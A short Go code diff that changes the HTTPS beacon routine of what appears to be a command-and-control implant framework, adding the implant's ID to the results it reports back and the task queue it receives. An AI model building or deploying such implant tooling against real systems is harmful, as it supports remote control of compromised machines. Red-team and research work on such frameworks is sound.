@@ -28,10 +28,19 @@ func NewHTTPSC2Communicator() *HTTPSC2Communicator {
 	}
 }
 
+type BeaconPayload struct {
+	ImplantID uint     `json:"implant-id"`
+	Results   []Result `json:"results"`
+}
+
 // Beacon sends results and returns the next TaskQueue
-func (h *HTTPSC2Communicator) Beacon(results []Result) (*TaskQueue, error) {
+func (h *HTTPSC2Communicator) Beacon(implantID uint, results []Result) (*TaskQueue, error) {
 	// 1. Marshal results
-	body, err := json.Marshal(results)
+	payload := BeaconPayload{
+		ImplantID: implantID, // TODO: fix so that it uses JWT so its more secure
+		Results:   results,
+	}
+	body, err := json.Marshal(payload)
 	if err != nil {
 		return nil, fmt.Errorf("marshal results: %w", err)
 	}
